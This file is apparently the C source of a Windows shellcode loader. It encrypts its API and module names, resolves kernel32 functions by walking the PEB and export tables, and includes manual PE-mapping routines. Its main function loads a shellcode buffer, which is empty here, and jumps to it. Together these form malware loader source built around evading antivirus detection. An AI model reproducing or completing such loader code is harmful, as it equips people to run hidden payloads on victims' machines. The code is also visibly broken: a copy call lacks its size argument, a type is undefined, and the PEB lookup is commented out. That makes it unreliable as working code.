#include <windows.h>
#include <winternl.h>

// clang --target=i686-pc-windows-gnu "-Wl,--entry=__start" -nostartfiles -nostdlib filepath.c -g -o  thisisthefilemyman.exe

// The variables and prototypes necessary for decryption

#define NUM_ROWS (4)
#define NUM_COLUMNS (4)

const int key_matrix_inverse[NUM_ROWS][NUM_COLUMNS] = {
    {124, 188, 152, 99}, 
    {60, 88, 23, 36}, 
    {163, 98, 190, 170},
    {220, 89, 88, 9}
};

int data_matrix[NUM_ROWS][NUM_COLUMNS] = {0};
int last_matrix[NUM_ROWS][NUM_COLUMNS] = {0};
int tmp_matrix[NUM_ROWS][NUM_COLUMNS] = {0};

const int iv_length = 16;

void decrypt_data(char *src, DWORD size);

// Variables to load kernel32.dll and use its functions

#define GET_PROC_ADDRESS_INDEX (0)
#define LOAD_LIBRARY_A_INDEX (1)
#define GET_MODULE_HANDLE_A_INDEX (2)
#define VIRTUAL_ALLOC_INDEX (3)
#define VIRTUAL_PROTECT_INDEX (4)
#define HEAP_FREE_INDEX (5)
#define HEAP_ALLOC_INDEX (6)
#define GET_PROCESS_HEAP_INDEX (7)
#define WRITE_FILE_INDEX (8)
#define GET_STD_HANDLE_INDEX (9)
#define VIRTUAL_FREE_INDEX (10)

PPEB peb_windows_structure = NULL;
void *kernel_library_address = NULL;
int number_kernel_library_functions = 11;
void *kernel_library_function_addresses[11] = {};
char encrypted_kernel_library_name[] = "\xbb\x3c\xf2\x31\x79\x1b\x07\x59\xb9\x85\x63\xce\xa7\x98\x80\x94\x1d\xb4\x4b\x16\x17\x7f\x34\x68\x24\x4b\xfc\x9a\xba\x54\x40\xa2\x04\x2a\x3d\xc4\x8a\x5f\x5b\x48\x04\x32\x1c\x2d\x94\xaa\x60\xd8";
int size_encrypted_kernel_library_name = 48;
const wchar_t *kernel_library_name = NULL;
// expected order is 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree'.encode('ascii') + b'\x00'
char encrypted_kernel_library_function_names[] = "\xa0\x96\x48\xdc\xc3\x48\x76\x39\x35\xc3\x72\x08\xc5\xd2\x0f\x34\xc6\x7d\x46\x6d\x7a\xb7\x02\x14\xac\xe8\xf0\x49\xad\x21\x90\x29\xa6\xa3\x20\xbe\x65\xae\xe0\x68\x2a\x2f\x1b\x53\x04\x3c\x28\x1c\x62\x38\xf8\xcf\xdd\x81\xd7\x7b\x07\xb6\xc3\x5b\xd4\x6b\x22\x22\xfd\x3a\x15\x4d\xbe\x65\x6b\x36\xbe\x6d\xb9\x06\xd4\xf9\x5c\xd7\xcf\x3e\xa2\xa2\x9d\x16\xc1\x8b\xd0\xc8\xd7\x31\x95\x52\x4e\x93\x12\x45\xcb\x78\x94\x56\x0b\x17\xb0\x24\x29\x79\x88\x4e\x6c\xe7\x8e\x73\x63\x22\xde\xe3\x0c\x3e\x38\x93\x08\xfe\xf1\xb8\x78\x93\x04\xe0\x6f\x7e\x4d\x85\xa1\x27\x79\x14\xa2\x39\x47\xa0\x66\xda\xff\xf1\xee\x41\x70\x1f\xc1\x76\x6c\x4b\x3b\x63\x78\x1e\x3e\xe2";
int size_encrypted_kernel_library_function_names = 160;
const char *kernel_library_function_names = NULL;

// START C STANDARD LIBRARY REPLACEMENT

// replacement_string - compare strings
int replacement_string(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return (unsigned char)*s1 - (unsigned char)*s2;
}

// replacement_memcpy - copy memory
void *replacement_memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) {
        *d++ = *s++;
    }
    return dest;
}

// replacement_memset - set memory
void *replacement_memset(void *s, int c, size_t n) {
    unsigned char *p = (unsigned char *)s;
    while (n--) {
        *p++ = (unsigned char)c;
    }
    return s;
}


void *replacement_malloc(size_t size) {
    return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void replacement_free(void *ptr) {
    if (ptr) {
        ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, MEM_RELEASE);
    }
}

int wcs_equals(const wchar_t *s1, const wchar_t *s2) {
    while (*s1 == *s2) {
        if (*s1 == 0) return 1;  // match
        s1++;
        s2++;
    }
    return 0;  // no match
}

int compare_file_name(const wchar_t *path, const wchar_t *name){
    const wchar_t *basename = path;
    while((* basename) != 0){
	basename++;
    }
    while((* basename) != L'\\'){
	basename--;
    }
    basename++;
    return wcs_equals(basename, name);
}

const wchar_t *get_library_by_number(const wchar_t *buffer, int n){
    const wchar_t *current = buffer;
    for(int i = 0; i < n; i++){
     	while((*current) != 0){
	    current++;
	}
    	current++;
    }
    return current;
}

const char *get_function_by_number(const char *buffer, int n){
    const char *current = buffer;
    for(int i = 0; i < n; i++){
	while((*current) != '\x00'){
	    current++;
        }
	current++;
    }
    return current;
}

void *get_module_address(PPEB process_env_block, const wchar_t *module_name){
    LIST_ENTRY *linked_list_head = &(process_env_block->Ldr->InMemoryOrderModuleList);
    LIST_ENTRY *current_module = linked_list_head->Flink;
    while(current_module != linked_list_head){
    	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) (((BYTE *) current_module) - (sizeof(PVOID) * 2));
	if(entry->FullDllName.Buffer != NULL && compare_file_name(entry->FullDllName.Buffer, module_name)){
	    return entry->DllBase;
	}
    	current_module = current_module->Flink;
    }
    return NULL;
}

void *get_function_address(void *module_address, const char *function_name){
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *) module_address;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *) (((BYTE *) module_address) + dos_header->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *export_directory = (IMAGE_EXPORT_DIRECTORY *) (((BYTE *) module_address) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names_exported = (DWORD *) (((BYTE *) module_address) + export_directory->AddressOfNames);
    WORD  *ordinals = (WORD *) (((BYTE *) module_address) + export_directory->AddressOfNameOrdinals);
    DWORD *function_address_array = (DWORD*)(((BYTE *) module_address) + export_directory->AddressOfFunctions);
    
    for (DWORD i = 0; i < export_directory->NumberOfNames; i++) {
        const char *function_in_module = (const char *) (((BYTE *) module_address) + names_exported[i]);
        if (replacement_string(function_in_module, function_name) == 0) {
            WORD selected_ordinal = ordinals[i];
            return (((BYTE *) module_address) + function_address_array[selected_ordinal]);
        }
    }
    return NULL;    
}

void init_kernel_library(void){
    decrypt_data(encrypted_kernel_library_name, size_encrypted_kernel_library_name);
    decrypt_data(encrypted_kernel_library_function_names, size_encrypted_kernel_library_function_names);
    
    kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
    kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
     
    //__asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
    kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
    for(int i = 0; i < number_kernel_library_functions; i++){
	const char *function_name = get_function_by_number(kernel_library_function_names, i);
        kernel_library_function_addresses[i] = get_function_address(kernel_library_address, function_name);
    }

}

// #include "crypto_interface.h"
void matrix_xor(int (*matrix_1)[NUM_COLUMNS], int (*matrix_2)[NUM_COLUMNS], int (*matrix_result)[NUM_COLUMNS]){
    for(int i = 0; i < NUM_ROWS; i++)
        for(int j = 0; j < NUM_COLUMNS; j++)
            matrix_result[i][j] = matrix_1[i][j] ^ matrix_2[i][j];
}

void matrix_mul(int (*matrix_1)[NUM_COLUMNS], int (*matrix_2)[NUM_COLUMNS], int (*matrix_result)[NUM_COLUMNS]){
    for(int i = 0; i < NUM_ROWS; i++)
        for(int j = 0; j < NUM_COLUMNS; j++){
            matrix_result[i][j] = 0;
            for(int k = 0; k < NUM_ROWS; k++)
                matrix_result[i][j] += matrix_1[i][k] * matrix_2[k][j];
            matrix_result[i][j] %= 256;
        }
}

void array_add(char *dest, char *adder){
    for(int i = 0; i < 16; i++){
        dest[i] = (dest[i] + adder[i]) % 256;
    }
}

void decrypt_data(char* src, DWORD size) {
    int num_multiplications = size / 16;
    int bytes_remaining = size % 16;

    for(int i = 0; i < num_multiplications - 1; i++){
        array_add(src + (i * 16), src + ((num_multiplications - 1) * 16));
    }

    for(int i = 0; i < num_multiplications; i++){
        for(int k = 4 * i; k < ((i + 1) * 4); k++)
            for(int j = k * 4; j < ((k+1) * 4); j++)
                data_matrix[k % 4][j % 4] = (unsigned char) src[j];
        
        matrix_mul(data_matrix, (int (*)[NUM_COLUMNS]) key_matrix_inverse, tmp_matrix);
        
        if(i != 0)
            matrix_xor(tmp_matrix, last_matrix, tmp_matrix);

        for(int j = 0; j < NUM_ROWS; j++)
            for(int k = 0; k < NUM_COLUMNS; k++)
                last_matrix[j][k] = data_matrix[j][k];

        for(int k = i * 4; k < (i+1) * 4; k++)
            for(int j = k * 4; j < (k+1) * 4; j++)
                src[j] = tmp_matrix[(j % 16) / 4][(j % 16) % 4];
    }
    
    for(int i = 0; i < (bytes_remaining/4) + 1; i++){
        int j_range = 4;
        if(i == (bytes_remaining / 4))
            j_range = bytes_remaining % 4;
        for(int j = 0; j < j_range; j++)
            src[(size - (size % 16)) + (i * 4) + j] ^= last_matrix[i][j];
    }
}

// #include "code_handling.h"

void copy_to_virtual(const char *pe_data, char *image_base){
    IMAGE_DOS_HEADER* source_pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
    IMAGE_NT_HEADERS* source_pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + source_pe_dos_header->e_lfanew);
    IMAGE_SECTION_HEADER* source_sections = (IMAGE_SECTION_HEADER *) (source_pe_nt_header + 1); 

    // First copy the headers
    replacement_memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
    
    // Now copy each section
    for(int i = 0; i < source_pe_nt_header->FileHeader.NumberOfSections; i++){
        // Copy section to BASE + RVA = virtual address
        char *dest = image_base + source_sections[i].VirtualAddress;

        // Copy raw data or set to 0 if there is none
        if(source_sections[i].SizeOfRawData > 0){
            replacement_memcpy(dest, pe_data + source_sections[i].PointerToRawData, source_sections[i].SizeOfRawData);
        } else {
            replacement_memset(dest, 0, source_sections[i].Misc.VirtualSize);
        }
    }
}

char *copy_to_pages(const char *pe_data){
    IMAGE_DOS_HEADER *pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
    IMAGE_NT_HEADERS *pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + pe_dos_header->e_lfanew);

    char *image_base = ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, pe_nt_header->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(image_base == NULL)
        return NULL;

    copy_to_virtual(pe_data, image_base);

    return image_base;
}

int load_libraries(in_memory_pe *new_pe){
    // For each module to import
    for(int i = 0; new_pe->import_descriptors[i].OriginalFirstThunk != 0; i++){
        // Get the dll name and import it
        char *module_name = new_pe->data + new_pe->import_descriptors[i].Name;
        HMODULE import_module = ((HMODULE (__stdcall *)(const char *)) kernel_library_function_addresses[1])(module_name);
        if(import_module == NULL)
            return -1;
        
        // IDT and IAT of module
        IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].OriginalFirstThunk);
        IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].FirstThunk);

        // get the address of each function
        for(int i = 0; lookup_table[i].u1.AddressOfData != 0; i++){
            void* function_handle = NULL;
            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
            if((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) {
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import =(IMAGE_IMPORT_BY_NAME*) (new_pe->data + lookup_addr);
                char* funct_name = (char *) &(image_import->Name);
                function_handle =((void * (__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, funct_name);
            } else {
                // import by ordinal, directly
                function_handle = ((void * (__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, (LPSTR) lookup_addr);
            }
            
            if(function_handle == NULL) {
                return -1;
            }

            // change the IAT, and put the function address inside.
            address_table[i].u1.Function = (DWORD) function_handle;
        }
    }

    return 0;
}

void resolve_relocations(in_memory_pe *new_pe){
    DWORD delta_reloc = ((DWORD) (new_pe->data)) - new_pe->pe_nt_header->OptionalHeader.ImageBase;

    // do this if there is a relocation table and the there is a need to relocate
    if(new_pe->data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_reloc != 0){
        // Find the relocation address table
        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (new_pe->data + new_pe->data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while(p_reloc->VirtualAddress != 0) {
            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
            WORD* reloc = (WORD*) (p_reloc + 1);
            for(int i=0; i<size; ++i) {
                int type = reloc[i] >> 12;
                int offset = reloc[i] & 0x0fff;
                DWORD* change_addr = (DWORD*) (new_pe->data + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change
                switch(type){
                    case IMAGE_REL_BASED_HIGHLOW :
                        *change_addr += delta_reloc;
                        break;
                    default:
                        break;
                }
            }

            // switch to the next relocation block, based on the size
            p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
        }        
    }
}

int set_protections(in_memory_pe *new_pe){
    DWORD oldProtect;
   
    // Set protection of the headers
    if((((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[4]) (new_pe->data, new_pe->pe_nt_header->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect)) == 0)
        return -1;
    for(int i=0; i<new_pe->pe_nt_header->FileHeader.NumberOfSections; ++i) {
        char* dest = new_pe->data + new_pe->sections[i].VirtualAddress;
        DWORD s_perm = new_pe->sections[i].Characteristics;
        DWORD v_perm = 0; 
        if(s_perm & IMAGE_SCN_MEM_EXECUTE) {
            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else {
            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        }
        if((((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[4]) (dest, new_pe->sections[i].Misc.VirtualSize, v_perm, &oldProtect)) == 0)
            return -1;
    }

    return 0;
}

// Shellcode handling code 

char shellcode_to_execute[] = "";
DWORD shellcode_to_execute_size = 0;

void *shellcode_handling_load(char *shellcode_to_load, int shellcode_to_load_size){
    void *reserved_memory = replacement_malloc(shellcode_to_load_size);
    replacement_memcpy(reserved_memory, shellcode_to_load);
    return reserved_memory;    
}

void shellcode_handling_execute(void *shellcode_address){
    void (*execute_entry_point)(void) = (void(*)()) shellcode_address;
    execute_entry_point();
}

// MAIN

int main(void) {   
    init_kernel_library();
    void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, shellcode_to_execute_size);
    if(placed_shellcode == NULL){
	return -1;
    }
    shellcode_handling_execute(placed_shellcode);
    return 0;
}

